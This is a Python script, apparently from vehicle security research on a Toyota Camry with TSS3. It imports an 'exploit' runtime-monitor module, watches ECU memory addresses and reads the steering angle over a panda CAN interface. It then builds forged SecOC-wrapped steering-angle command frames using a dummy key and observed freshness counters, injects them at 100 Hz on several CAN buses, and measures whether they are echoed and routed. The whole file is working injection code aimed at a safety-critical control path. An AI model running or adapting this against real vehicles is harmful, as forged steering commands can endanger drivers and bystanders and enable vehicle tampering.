import time,threading
from exploit.ephemeral_runtime.camry_f33_runtime_monitor import MonitorSession, decode_secoc_sync, decode_steering_angle_deg
from opendbc.car.toyota.tss3 import TSS3B6CompanionFields,TSS3B6Template,TSS3Freshness,TSS3_B6_DUMMY_SECOC_KEY,build_b6_application,build_b6_secoc_frame,target_angle_deg_to_raw
s=MonitorSession(require_ready_parked=True)
for i,a in enumerate([0xFEBE5364,0xFEBE4C00,0xFEBE4C04,0xFEBE80BC,0xFEBEADB0,0xFEBE55E8,0xFEBE5600,0xFEBE5524]): s.set_watch(i,a)
s.set_running(True)
end=time.monotonic()+.4
while time.monotonic()<end: s.panda.can_recv(); time.sleep(.002)
ang=s.panda.latest(0,0x025); assert ang
raw=target_angle_deg_to_raw(decode_steering_angle_deg(ang[1]))

def state():
 st=s.read_state(); vv=[bytes.fromhex(v['bytes_le']) for v in st['values']]
 return st['sample_generation'], vv[0][0],vv[1][2],vv[4][0],vv

def seg(bus=None,hz=100,dur=.55):
 stop=threading.Event(); sent=0; echo0=s.panda.b6_echo_count(); errors=[]
 def tx():
  nonlocal sent
  seq=0; mc=0; cr=None; dl=time.monotonic(); tpl=TSS3B6Template(); comp=TSS3B6CompanionFields(additive_term_suppress=0,contribution_pct_1=0,contribution_pct_2=0)
  try:
   while not stop.is_set():
    s.panda.can_recv(); row=s.panda.latest(0,0x00F)
    if not row: continue
    sy=decode_secoc_sync(row[1]); r=int(sy['reset_counter'])
    if cr!=r: cr=r; mc=0
    app=build_b6_application(target_lateral_id=63,target_angle_raw=raw,sequence=seq,template=tpl,companions=comp)
    a,d,_=build_b6_secoc_frame(TSS3_B6_DUMMY_SECOC_KEY,app,TSS3Freshness(int(sy['trip_counter']),r,mc))
    s.panda.can_send(a,d,bus,fd=True); sent+=1; seq=(seq+1)&63; mc=(mc+1)&255
    dl+=1/hz; stop.wait(max(0,dl-time.monotonic()))
  except Exception as e: errors.append(repr(e)); stop.set()
 g0,r0,b30,a0,v0=state(); t0=time.monotonic(); th=None
 if bus is not None: th=threading.Thread(target=tx,daemon=True); th.start()
 time.sleep(dur)
 stop.set();
 if th: th.join(1)
 g1,r1,b31,a1,v1=state(); dt=time.monotonic()-t0
 print('bus',bus,'dt',round(dt,4),'sent',sent,'echo',s.panda.b6_echo_count()-echo0,'route_delta',(r1-r0)&255,'rate',round(((r1-r0)&255)/dt,1),'b3',b30,'->',b31,'adb',a0,'->',a1,'err',errors)
 time.sleep(.2)
for b in [None,None,0,2,1,None]: seg(b)
s.set_running(False)
